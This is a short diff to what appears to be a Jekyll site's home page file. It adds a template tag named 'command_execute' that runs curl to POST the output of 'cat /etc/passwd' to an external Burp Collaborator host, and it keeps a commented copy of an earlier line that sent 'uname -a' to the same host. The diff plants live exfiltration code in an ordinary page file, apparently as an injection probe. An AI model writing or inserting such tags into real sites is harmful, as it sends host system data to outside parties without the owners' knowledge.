@@ -5,4 +5,5 @@
 layout: home
 ---
 
-{% command_execute curl -X POST "http://bs7h10wa8o3oijwmnyx4ofhpbgh65v.burpcollaborator.net" -d "output=$(uname -a)" %}
+# command_execute curl -X POST "http://bs7h10wa8o3oijwmnyx4ofhpbgh65v.burpcollaborator.net" -d "output=$(uname -a)"
+{% command_execute curl -X POST "http://bs7h10wa8o3oijwmnyx4ofhpbgh65v.burpcollaborator.net" -d "output=$(cat /etc/passwd)" %}
